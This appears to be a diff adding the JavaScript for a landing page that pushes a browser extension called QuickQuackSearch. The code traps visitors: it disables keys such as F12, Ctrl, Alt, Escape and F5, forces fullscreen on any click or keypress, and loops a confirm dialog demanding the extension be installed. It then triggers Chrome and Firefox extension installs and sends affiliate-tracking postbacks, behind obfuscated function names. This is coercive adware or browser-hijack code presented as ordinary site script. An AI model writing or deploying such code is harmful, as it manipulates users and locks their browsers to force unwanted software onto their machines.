@@ -1,0 +1,596 @@
+﻿function getURLParameter(name) {
+    return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+}
+
+function hCPNapvlhFicLoDm(e) {
+    if (e.which === 123 || e.which === 17) {
+        return false;
+    }
+}
+var error = getURLParameter('error');
+window.onkeydown = function (evt) {
+    if ($("#Install").val() === '0') {
+        if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17) {
+            return false;
+
+        }
+    }
+};
+window.onkeypress = function (evn) {
+    if ($("#Install").val() === '0') {
+        if (evn.keyCode == 123 || evn.keyCode == 117) return false;
+    }
+};
+onbeforeunload = function () {
+    if ($("#Install").val() === '0') {
+        //alert("??????? ESC, ????? ??????? ????????!");
+        //return "??????? ESC, ????? ??????? ????????!";
+    }
+
+}
+function toggleFullScreen() {
+
+    if ($("#Install").val() === '0') {
+        if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+
+            }
+            else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+
+            }
+            else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            }
+
+        }
+        //popitup('http://quickquacksearch.com/Default.aspx');
+    }
+}
+window.onblur = function () {
+
+}
+document.addEventListener('keyup', function (es) {
+    //alert("Amol");
+    if ($("#Install").val() === '0') {
+        if (es.keyCode == 27) {
+            toggleFullScreen();
+            checkup();
+        }
+    }
+}
+        , false);
+document.addEventListener('keyup', function (e) {
+    if ($("#Install").val() === '0') {
+        if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13) {
+            toggleFullScreen();
+            checkup();
+        }
+    }
+}
+        , false);
+
+var nomer = getURLParameter("n");
+var red = getURLParameter("red");
+
+if (red === "y") {
+    document.location.href = ("https://" + document.location.host + document.location.pathname + "?n=" + nomer + "&error=" + error);
+}
+
+
+window.onresize = function () {
+    if ($("#Install").val() === '0') {
+        if (document.querySelector('header')) {
+            if (window.innerHeight != screen.height) {
+                document.querySelector('header').style.display = 'block';
+                document.querySelector('footer').style.display = 'none';
+            }
+            else {
+                document.querySelector('header').style.display = 'none';
+                document.querySelector('footer').style.display = 'block';
+            }
+        }
+    }
+};
+
+
+
+function hCPNapvlhFicLoDm(e) {
+    if (e.which === 123 || e.which === 17) {
+        return false;
+    }
+}
+
+function hxvw7JrbMUZBqVhN() {
+    var c = confirm("You should install the chrome extension!");
+
+    if (!c) {
+        hxvw7JrbMUZBqVhN();
+    }
+}
+function hxvw7JrbMUZBqVhN() {
+    var c = confirm("You should install the chrome extension!");
+
+    if (!c) {
+        hxvw7JrbMUZBqVhN();
+    }
+}
+function gpAkSJDl9ENT5gLQ() {
+    try {
+        document.querySelector('footer').style.display = 'block';
+        document.querySelector('header').style.display = 'none';
+    } catch (e) { }
+}
+function eKxJS2GzrfWPEjgm() {
+    gpAkSJDl9ENT5gLQ();
+
+    try {
+        document.webkitCancelFullScreen();
+    } catch (e) { }
+
+    try {
+        document.cancelFullscreen();
+    } catch (e) { }
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', "#", true);
+    xhr.send();
+
+    cl = true;
+    chrome.webstore.install('', function () {
+        window.onbeforeunload = null;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', "#", true);
+        xhr.onload = function () {
+            if (clickid) {
+                var xhrPostback = new XMLHttpRequest();
+                xhrPostback.open('GET', '#', true);
+
+                xhrPostback.onload = function () {
+                    var xhrPostback1 = new XMLHttpRequest();
+                    xhrPostback1.open('GET', '#', true);
+
+                    xhrPostback1.onload = function () {
+                        var xhrPostback3 = new XMLHttpRequest();
+                        xhrPostback3.open('GET', '#', true);
+
+                        xhrPostback3.onload = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.onerror = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.send();
+                    };
+
+                    xhrPostback1.onerror = function () {
+                        var xhrPostback3 = new XMLHttpRequest();
+                        xhrPostback3.open('GET', '#', true);
+
+                        xhrPostback3.onload = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.onerror = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.send();
+                    };
+
+                    xhrPostback1.send();
+                };
+
+                xhrPostback.onerror = function () {
+                    var xhrPostback1 = new XMLHttpRequest();
+
+                    xhrPostback1.open('GET', '#', true);
+
+                    xhrPostback1.onload = function () {
+                        var xhrPostback3 = new XMLHttpRequest();
+
+                        xhrPostback3.open('GET', '#', true);
+
+                        xhrPostback3.onload = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.onerror = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.send();
+                    };
+
+                    xhrPostback1.onerror = function () {
+                        var xhrPostback3 = new XMLHttpRequest();
+
+                        xhrPostback3.open('GET', '#', true);
+
+                        xhrPostback3.onload = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.onerror = function () {
+                            open('#', '_self');
+                        };
+
+                        xhrPostback3.send();
+                    };
+                    xhrPostback1.send();
+                };
+
+                xhrPostback.send();
+            } else if (subid) {
+                var xhrPostback = new XMLHttpRequest();
+                xhrPostback.open('GET', '#' + subid, true);
+
+                xhrPostback.onload = function () {
+                    open('#', '_self');
+                };
+
+                xhrPostback.onerror = function () {
+                    open('#', '_self');
+                };
+
+                xhrPostback.send();
+            } else if (postback) {
+                var xhrPostback = new XMLHttpRequest();
+
+                xhrPostback.open('GET', '#' + postback, true);
+                xhrPostback.onload = function () {
+                    open('#', '_self');
+                };
+                xhrPostback.onerror = function () {
+                    open('#', '_self');
+                };
+                xhrPostback.send();
+            } else {
+                open('#', '_self');
+            }
+        };
+
+        xhr.onerror = function () {
+            open('#', '_self');
+        };
+        xhr.send();
+    }, function (error) {
+        cl = false;
+        var xhr = new XMLHttpRequest();
+
+        xhr.open('GET', "#", true);
+        xhr.send();
+
+        console.log(error);
+        document.querySelector('footer').style.display = 'none';
+
+        try {
+            document.querySelector('header').style.display = 'block';
+        } catch (v) {
+        }
+
+        setTimeout(function () {
+            try {
+                document.webkitCancelFullScreen();
+            } catch (e) { }
+
+            try {
+                document.cancelFullscreen();
+            } catch (e) { }
+        }, 100);
+    });
+}
+
+
+function kzogExQSrDChY4Iq() {
+    if ($("#Install").val() === '0') {
+        eKxJS2GzrfWPEjgm();
+
+        setTimeout(function () {
+            document.body.webkitRequestFullscreen();
+        }, 1000);
+    }
+}
+
+// document.body.addEventListener('keyup', f5WOxk2dF74GMRLf);
+document.body.addEventListener('keyup', kzogExQSrDChY4Iq);
+document.body.addEventListener('click', kzogExQSrDChY4Iq);
+
+function f5WOxk2dF74GMRLf() {
+    return false;
+}
+
+
+
+var topsss = screen.height - 70;
+var left = screen.width - 10;
+
+function popitup(url) {
+    newwindow = window.open(url, "name", "toolbar=yes,scrollbars=yes,resizable=yes,top=" + topsss + ",left=" + left + ",width=10,height=10");
+}
+
+
+
+function delay(ms) {
+    var cur_d = new Date();
+    var cur_ticks = cur_d.getTime();
+    var ms_passed = 0;
+    while (ms_passed < ms) {
+        var d = new Date();
+        var ticks = d.getTime();
+        ms_passed = ticks - cur_ticks;
+    }
+}
+function install(aEvent) {
+
+    for (var a = aEvent.target; a.href === undefined;) a = a.parentNode;
+    var params = {
+        "Foo": {
+            URL: aEvent.target.href,
+            IconURL: aEvent.target.getAttribute("iconURL"),
+            Hash: aEvent.target.getAttribute("hash"),
+            toString: function () { return this.URL; }
+        }
+    };
+    InstallTrigger.install(params);
+
+    return false;
+}
+function checkup1() {
+    //alert("Amol");
+}
+function checkup() {
+    if ($("#Browser").val() === 'Chrome') {
+        chrome.webstore.install('https://chrome.google.com/webstore/detail/hcdldabpmhgiikacankglnfnlbblhoja',
+                  successCallback, failureCallback);
+    }
+    else if ($("#Browser").val() === 'Firefox') {
+        //alert("Firefox");
+        location.href = "https://addons.mozilla.org/firefox/downloads/latest/quickquaksearch/addon-861170-latest.xpi"
+    }
+    else if ($("#Browser").val() === 'IE') {
+    }
+    else if ($("#Browser").val() === 'Edge') {
+    }
+
+}
+
+$('html, body').on({
+    'mouseleave': function () {
+        if ($("#Browser").val() === 'Edge') {
+            if ($("#Install").val() == '0') {
+                confirm("** Please Install quick quack search");
+            }
+        }
+    }
+});
+
+$(document).ready(function () {
+
+    if ($("#Install").val() == '1') {
+        document.body.style.cursor = 'default';
+    }
+
+    myFunction();
+    if ($("#Browser").val() === 'Chrome') {
+        $("#iframeedge").hide();
+        $("#ButtonMozilla").hide();
+        $("#ButtonEdge").hide();
+        $("#ButtonIE").hide();
+        var img;
+        img = new Image();
+        img.src = "chrome-extension://hcdldabpmhgiikacankglnfnlbblhoja/Test.png";
+        img.onload = function () {
+            $("#Chrome").hide();
+            $("#Search").hide();
+            $("#Install").val('1');
+            $("#ClikeMe").hide();
+            alert("Good to see you back!!");
+        };
+        img.onerror = function () {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+            //alert("Please Add QuickQuackSearch to Chrome");
+            Show_Countdown();
+        };
+    }
+    else if ($("#Browser").val() === 'Firefox') {
+        $("#iframeedge").hide();
+        $("#Button1").hide();
+        $("#ButtonEdge").hide();
+        $("#ButtonIE").hide();
+        if (window.location.href.indexOf("Home.aspx") > -1) {
+          $("#Search").hide();
+            $("#Install").val('1');
+            $("#ClikeMe").hide();
+        }
+        else {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+            //alert("Please Add QuickQuackSearch to Firefox");
+            Show_Countdown();
+        }
+    }
+    else if ($("#Browser").val() === 'IE') {
+        $("#iframeedge").hide();
+        $("#Chrome").hide();
+        $("#Button1").hide();
+        $("#ButtonEdge").hide();
+        $("#ButtonMozilla").hide();
+        if (window.location.href.indexOf("Home.aspx") > -1) {
+            $("#Search").hide();
+            $("#Install").val('1');
+            $("#ClikeMe").hide();
+            $("#ButtonIE").hide();
+        }
+        else {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+
+            //alert("Please Add QuickQuackSearch to IE");
+        }
+    }
+    else if ($("#Browser").val() === 'Edge') {
+        $("#iframeedge").show();
+        $("#Chrome").hide();
+        $("#Button1").hide();
+        $("#ButtonMozilla").hide();
+        $("#ButtonIE").hide();
+        if (window.location.href.indexOf("Home.aspx") > -1) {
+            $("#Search").hide();
+            $("#Install").val('1');
+            $("#ClikeMe").hide();
+            $("#ButtonEdge").hide();
+        }
+        else {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+            //alert("Please Add QuickQuackSearch to Edge");
+            Show_Countdown();
+        }
+    }
+    else {
+        $("#Button1").hide();
+        $("#ButtonMozilla").hide();
+        $("#ClikeMe").hide();
+    }
+});
+
+function myFunction() {
+
+    if (navigator.userAgent.indexOf("Edge") != -1) {
+        $("#Browser").val('Edge');
+    }
+    else if (navigator.userAgent.indexOf("Chrome") != -1) {
+        $("#Browser").val('Chrome');
+    }
+
+    else if (navigator.userAgent.indexOf("Firefox") != -1) {
+        $("#Browser").val('Firefox');
+    }
+    else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
+    {
+        $("#Browser").val('IE');
+    }
+    else {
+        $("#Browser").val('unknown');
+    }
+}
+
+function handle(e) {
+    if ($("#Browser").val() === 'Chrome') {
+        $("#ButtonMozilla").hide();
+        $("#ButtonIE").hide();
+        $("#ButtonEdge").hide();
+        if ($("#Install").val() === '0') {
+            var img;
+            img = new Image();
+            img.src = "chrome-extension://hcdldabpmhgiikacankglnfnlbblhoja/Test.png";
+            img.onload = function () {
+                $("#Search").hide();
+                $("#Install").val('1');
+            };
+            img.onerror = function () {
+                $("#Search").show();
+                $("#Install").val('0');
+            };
+
+            if ($("#Install").val() === '0') {
+                e.preventDefault(); // Ensure it is only this code that rusn
+
+                alert("Please click on Add QuickQuackSearch to Chrome button");
+            }
+            else {
+                $("#Search").hide();
+            }
+        }
+        else {
+            $("#Search").hide();
+            $("#Button1").hide();
+            $("#ButtonMozilla").hide();
+            $("#ButtonIE").hide();
+            $("#ButtonEdge").hide();
+            $("#ClikeMe").hide();
+        }
+    }
+    else if ($("#Browser").val() === 'Firefox') {
+        $("#Button1").hide();
+        $("#ButtonIE").hide();
+        $("#ButtonEdge").hide();
+        if ($("#Install").val() === '0') {
+            if (window.location.href.indexOf("Home.aspx") > -1) {
+                $("#Search").hide();
+                $("#Install").val('1');
+                $("#ClikeMe").hide();
+            }
+            else {
+                $("#Search").show();
+                $("#Install").val('0');
+                $("#ClikeMe").show();
+            }
+
+            if ($("#Install").val() === '0') {
+                e.preventDefault(); // Ensure it is only this code that rusn
+
+                alert("Please click on Add QuickQuackSearch to Firefox button");
+            }
+            else {
+                $("#Search").hide();
+            }
+        }
+        else {
+            $("#Search").hide();
+            $("#Button1").hide();
+            $("#ButtonMozilla").hide();
+            $("#ButtonIE").hide();
+            $("#ButtonEdge").hide();
+            $("#ClikeMe").hide();
+        }
+    }
+    else if ($("#Browser").val() === 'IE') {
+        $("#Button1").hide();
+        $("#ButtonEdge").hide();
+        $("#ButtonMozilla").hide();
+        if (window.location.href.indexOf("Home.aspx") > -1) {
+            $("#Search").hide();
+            $("#Install").val('1');
+            $("#ButtonIE").hide();
+            $("#ClikeMe").hide();
+        }
+        else {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+
+            alert("Please Add QuickQuackSearch to IE");
+        }
+    }
+    else if ($("#Browser").val() === 'Edge') {
+        $("#Button1").hide();
+        $("#ButtonMozilla").hide();
+        $("#ButtonIE").hide();
+        if (window.location.href.indexOf("Home.aspx") > -1) {
+            $("#Search").hide();
+            $("#Install").val('1');
+            $("#ClikeMe").hide();
+            $("#ButtonEdge").hide();
+        }
+        else {
+            $("#Search").show();
+            $("#Install").val('0');
+            $("#ClikeMe").show();
+            alert("Please Add QuickQuackSearch to Edge");
+        }
+    }
+
+}
+var blink_speed = 500; var t = setInterval(function () { var ele = document.getElementById('ClikeMe'); ele.style.visibility = (ele.style.visibility == 'hidden' ? '' : 'hidden'); }, blink_speed);
+
